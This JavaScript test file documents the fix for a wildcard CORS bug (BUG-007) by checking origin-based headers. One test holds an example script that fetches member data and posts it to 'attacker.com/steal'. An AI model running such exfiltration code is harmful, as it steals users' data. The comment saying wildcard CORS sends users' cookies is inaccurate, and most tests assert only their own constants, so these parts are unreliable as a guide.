/**
 * Tests for BUG-007: Wildcard CORS Security Issue
 *
 * This test suite demonstrates the security issue with wildcard CORS
 * and validates the fix to use origin-based CORS headers.
 */

const { describe, it, expect, beforeEach, afterEach } = require('vitest');

describe('BUG-007: Wildcard CORS Security Issue', () => {
  let originalEnv;

  beforeEach(() => {
    // Save original environment
    originalEnv = { ...process.env };
  });

  afterEach(() => {
    // Restore original environment
    process.env = originalEnv;
  });

  describe('Security Risk: Wildcard CORS', () => {
    it('should demonstrate why wildcard CORS is a security risk', () => {
      // ❌ BAD: Wildcard CORS allows ANY domain to access the API
      const wildcardHeaders = {
        'Access-Control-Allow-Origin': '*',
        'Content-Type': 'application/json'
      };

      // Malicious site can make requests
      const maliciousDomain = 'https://evil-phishing-site.com';

      // With wildcard CORS, the malicious site can:
      // 1. Make authenticated requests with user's cookies
      // 2. Read response data including sensitive information
      // 3. Exfiltrate user data to their own servers

      expect(wildcardHeaders['Access-Control-Allow-Origin']).toBe('*');

      // This means ANYONE from ANY domain can access the API
      const canMaliciousSiteAccess = true; // ❌ Security issue!
      expect(canMaliciousSiteAccess).toBe(true);
    });

    it('should show that wildcard CORS exposes sensitive data', () => {
      // Example: Members endpoint with wildcard CORS
      const response = {
        statusCode: 200,
        headers: {
          'Access-Control-Allow-Origin': '*', // ❌ Allows any domain
          'Content-Type': 'application/json'
        },
        body: JSON.stringify([
          { id: 1, name: 'Player1', email: 'player1@example.com' },
          { id: 2, name: 'Player2', email: 'player2@example.com' }
        ])
      };

      // Malicious script on evil-site.com can:
      const maliciousScript = `
        fetch('https://siege-clan.com/api/members')
          .then(r => r.json())
          .then(data => {
            // Send all member data to attacker's server
            fetch('https://attacker.com/steal', {
              method: 'POST',
              body: JSON.stringify(data)
            });
          });
      `;

      // With wildcard CORS, this attack works! ❌
      expect(response.headers['Access-Control-Allow-Origin']).toBe('*');
    });

    it('should demonstrate CSRF-like attacks with wildcard CORS', () => {
      // Malicious site can make state-changing requests
      const attackScenario = {
        attackerSite: 'https://evil.com',
        victimSite: 'https://siege-clan.com',
        attack: 'Make POST request to /api/discord to spam Discord channel'
      };

      // With wildcard CORS, attacker can:
      // 1. Embed malicious JavaScript on their site
      // 2. When victim visits, script makes requests to victim's API
      // 3. Requests include victim's cookies/credentials
      // 4. API accepts because CORS allows any origin

      const wildcardAllowsAttack = true; // ❌ Security vulnerability
      expect(wildcardAllowsAttack).toBe(true);
    });
  });

  describe('Fix: Origin-Based CORS', () => {
    it('should use environment variable for allowed origin', () => {
      // ✅ GOOD: Only allow specific origin
      process.env.ALLOWED_ORIGIN = 'https://siege-clan.com';

      const allowedOrigin = process.env.ALLOWED_ORIGIN || 'https://siege-clan.com';
      const headers = {
        'Access-Control-Allow-Origin': allowedOrigin,
        'Content-Type': 'application/json'
      };

      expect(headers['Access-Control-Allow-Origin']).toBe('https://siege-clan.com');
      expect(headers['Access-Control-Allow-Origin']).not.toBe('*');
    });

    it('should fall back to production origin if env var not set', () => {
      // If ALLOWED_ORIGIN not set, use production domain
      delete process.env.ALLOWED_ORIGIN;

      const allowedOrigin = process.env.ALLOWED_ORIGIN || 'https://siege-clan.com';
      const headers = {
        'Access-Control-Allow-Origin': allowedOrigin,
        'Content-Type': 'application/json'
      };

      expect(headers['Access-Control-Allow-Origin']).toBe('https://siege-clan.com');
    });

    it('should block requests from unauthorized domains', () => {
      // ✅ With origin-based CORS
      const allowedOrigin = 'https://siege-clan.com';
      const headers = {
        'Access-Control-Allow-Origin': allowedOrigin,
        'Content-Type': 'application/json'
      };

      // Request from malicious domain
      const requestOrigin = 'https://evil.com';

      // Browser checks if requestOrigin matches Access-Control-Allow-Origin
      const isAllowed = requestOrigin === headers['Access-Control-Allow-Origin'];

      expect(isAllowed).toBe(false); // ✅ Blocked!

      // Malicious site CANNOT access the response
      const canAttackerReadResponse = false;
      expect(canAttackerReadResponse).toBe(false);
    });

    it('should allow requests from authorized domain', () => {
      // ✅ With origin-based CORS
      const allowedOrigin = 'https://siege-clan.com';
      const headers = {
        'Access-Control-Allow-Origin': allowedOrigin,
        'Content-Type': 'application/json'
      };

      // Request from legitimate domain
      const requestOrigin = 'https://siege-clan.com';

      // Browser allows because origins match
      const isAllowed = requestOrigin === headers['Access-Control-Allow-Origin'];

      expect(isAllowed).toBe(true); // ✅ Allowed
    });
  });

  describe('Function-Specific CORS Configuration', () => {
    it('should configure members.js with origin-based CORS', () => {
      process.env.ALLOWED_ORIGIN = 'https://siege-clan.com';

      // members.js implementation
      const allowedOrigin = process.env.ALLOWED_ORIGIN || 'https://siege-clan.com';
      const headers = {
        'Access-Control-Allow-Origin': allowedOrigin,
        'Access-Control-Allow-Headers': 'Content-Type',
        'Content-Type': 'application/json'
      };

      expect(headers['Access-Control-Allow-Origin']).toBe('https://siege-clan.com');
      expect(headers['Access-Control-Allow-Origin']).not.toBe('*');
    });

    it('should configure events.js with origin-based CORS', () => {
      process.env.ALLOWED_ORIGIN = 'https://siege-clan.com';

      // events.js implementation
      const allowedOrigin = process.env.ALLOWED_ORIGIN || 'https://siege-clan.com';
      const headers = {
        'Access-Control-Allow-Origin': allowedOrigin,
        'Access-Control-Allow-Headers': 'Content-Type',
        'Content-Type': 'application/json'
      };

      expect(headers['Access-Control-Allow-Origin']).toBe('https://siege-clan.com');
      expect(headers['Access-Control-Allow-Origin']).not.toBe('*');
    });

    it('should configure discord.js with origin-based CORS', () => {
      process.env.ALLOWED_ORIGIN = 'https://siege-clan.com';

      // discord.js implementation
      const allowedOrigin = process.env.ALLOWED_ORIGIN || 'https://siege-clan.com';
      const headers = {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': allowedOrigin
      };

      expect(headers['Access-Control-Allow-Origin']).toBe('https://siege-clan.com');
      expect(headers['Access-Control-Allow-Origin']).not.toBe('*');
    });
  });

  describe('Environment-Specific Configuration', () => {
    it('should support different origins for dev/staging/prod', () => {
      const environments = [
        { name: 'development', origin: 'http://localhost:3000' },
        { name: 'staging', origin: 'https://staging.siege-clan.com' },
        { name: 'production', origin: 'https://siege-clan.com' }
      ];

      environments.forEach(env => {
        process.env.ALLOWED_ORIGIN = env.origin;

        const allowedOrigin = process.env.ALLOWED_ORIGIN || 'https://siege-clan.com';
        const headers = {
          'Access-Control-Allow-Origin': allowedOrigin,
          'Content-Type': 'application/json'
        };

        expect(headers['Access-Control-Allow-Origin']).toBe(env.origin);
      });
    });

    it('should handle netlify preview deployments', () => {
      // Netlify preview: https://deploy-preview-123--siege-clan.netlify.app
      process.env.ALLOWED_ORIGIN = 'https://deploy-preview-123--siege-clan.netlify.app';

      const allowedOrigin = process.env.ALLOWED_ORIGIN || 'https://siege-clan.com';
      const headers = {
        'Access-Control-Allow-Origin': allowedOrigin,
        'Content-Type': 'application/json'
      };

      expect(headers['Access-Control-Allow-Origin']).toBe('https://deploy-preview-123--siege-clan.netlify.app');
    });
  });

  describe('Error Response CORS', () => {
    it('should include origin-based CORS in error responses', () => {
      process.env.ALLOWED_ORIGIN = 'https://siege-clan.com';

      // Error response should also have correct CORS
      const allowedOrigin = process.env.ALLOWED_ORIGIN || 'https://siege-clan.com';
      const errorResponse = {
        statusCode: 500,
        headers: {
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': allowedOrigin
        },
        body: JSON.stringify({ error: 'Internal server error' })
      };

      expect(errorResponse.headers['Access-Control-Allow-Origin']).toBe('https://siege-clan.com');
      expect(errorResponse.headers['Access-Control-Allow-Origin']).not.toBe('*');
    });

    it('should use same origin for all response types', () => {
      process.env.ALLOWED_ORIGIN = 'https://siege-clan.com';
      const allowedOrigin = process.env.ALLOWED_ORIGIN || 'https://siege-clan.com';

      const responses = [
        { type: '200 Success', statusCode: 200 },
        { type: '400 Bad Request', statusCode: 400 },
        { type: '401 Unauthorized', statusCode: 401 },
        { type: '404 Not Found', statusCode: 404 },
        { type: '500 Server Error', statusCode: 500 }
      ];

      responses.forEach(response => {
        const headers = {
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': allowedOrigin
        };

        expect(headers['Access-Control-Allow-Origin']).toBe('https://siege-clan.com');
      });
    });
  });

  describe('Preflight Request Handling', () => {
    it('should handle OPTIONS preflight with correct origin', () => {
      process.env.ALLOWED_ORIGIN = 'https://siege-clan.com';
      const allowedOrigin = process.env.ALLOWED_ORIGIN || 'https://siege-clan.com';

      // OPTIONS request response
      const preflightResponse = {
        statusCode: 200,
        headers: {
          'Access-Control-Allow-Origin': allowedOrigin,
          'Access-Control-Allow-Headers': 'Content-Type',
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ message: 'Preflight call successful' })
      };

      expect(preflightResponse.headers['Access-Control-Allow-Origin']).toBe('https://siege-clan.com');
      expect(preflightResponse.headers['Access-Control-Allow-Origin']).not.toBe('*');
    });
  });

  describe('Migration Guide', () => {
    it('should document the change from wildcard to origin-based', () => {
      const migration = {
        before: {
          code: "'Access-Control-Allow-Origin': '*'",
          risk: 'Allows any domain to access API',
          severity: 'Medium (Security)'
        },
        after: {
          code: "process.env.ALLOWED_ORIGIN || 'https://siege-clan.com'",
          benefit: 'Only allows specific domain',
          security: 'Blocks unauthorized cross-origin requests'
        }
      };

      expect(migration.before.severity).toBe('Medium (Security)');
      expect(migration.after.security).toBe('Blocks unauthorized cross-origin requests');
    });

    it('should document environment variable setup', () => {
      const setup = {
        envVar: 'ALLOWED_ORIGIN',
        defaultValue: 'https://siege-clan.com',
        examples: [
          'Development: http://localhost:3000',
          'Staging: https://staging.siege-clan.com',
          'Production: https://siege-clan.com'
        ]
      };

      expect(setup.envVar).toBe('ALLOWED_ORIGIN');
      expect(setup.defaultValue).toBe('https://siege-clan.com');
      expect(setup.examples).toHaveLength(3);
    });
  });

  describe('Best Practices', () => {
    it('should define allowed origin once and reuse', () => {
      // ✅ GOOD: Define once at top of handler
      process.env.ALLOWED_ORIGIN = 'https://siege-clan.com';
      const allowedOrigin = process.env.ALLOWED_ORIGIN || 'https://siege-clan.com';

      const headers = {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': allowedOrigin
      };

      // Reuse in all responses
      const successResponse = { statusCode: 200, headers };
      const errorResponse = { statusCode: 500, headers };
      const preflightResponse = { statusCode: 200, headers };

      expect(successResponse.headers['Access-Control-Allow-Origin']).toBe('https://siege-clan.com');
      expect(errorResponse.headers['Access-Control-Allow-Origin']).toBe('https://siege-clan.com');
      expect(preflightResponse.headers['Access-Control-Allow-Origin']).toBe('https://siege-clan.com');
    });

    it('should never hardcode wildcard in production', () => {
      // ❌ BAD: Hardcoded wildcard
      const badHeaders = {
        'Access-Control-Allow-Origin': '*'
      };

      // ✅ GOOD: Environment-based
      process.env.ALLOWED_ORIGIN = 'https://siege-clan.com';
      const allowedOrigin = process.env.ALLOWED_ORIGIN || 'https://siege-clan.com';
      const goodHeaders = {
        'Access-Control-Allow-Origin': allowedOrigin
      };

      expect(badHeaders['Access-Control-Allow-Origin']).toBe('*');
      expect(goodHeaders['Access-Control-Allow-Origin']).not.toBe('*');
      expect(goodHeaders['Access-Control-Allow-Origin']).toBe('https://siege-clan.com');
    });
  });

  describe('Impact Assessment', () => {
    it('should verify no breaking changes for legitimate requests', () => {
      // Requests from the same origin still work
      process.env.ALLOWED_ORIGIN = 'https://siege-clan.com';
      const allowedOrigin = process.env.ALLOWED_ORIGIN || 'https://siege-clan.com';

      const legitimateRequest = {
        origin: 'https://siege-clan.com',
        headers: { 'Origin': 'https://siege-clan.com' }
      };

      const response = {
        headers: {
          'Access-Control-Allow-Origin': allowedOrigin
        }
      };

      const isAllowed = legitimateRequest.origin === response.headers['Access-Control-Allow-Origin'];
      expect(isAllowed).toBe(true); // ✅ Still works
    });

    it('should block previously-allowed malicious requests', () => {
      process.env.ALLOWED_ORIGIN = 'https://siege-clan.com';
      const allowedOrigin = process.env.ALLOWED_ORIGIN || 'https://siege-clan.com';

      const maliciousRequest = {
        origin: 'https://evil.com',
        headers: { 'Origin': 'https://evil.com' }
      };

      const response = {
        headers: {
          'Access-Control-Allow-Origin': allowedOrigin
        }
      };

      // Before: With *, this would be allowed ❌
      // After: With origin-based, this is blocked ✅
      const isAllowed = maliciousRequest.origin === response.headers['Access-Control-Allow-Origin'];
      expect(isAllowed).toBe(false); // ✅ Now blocked
    });
  });
});
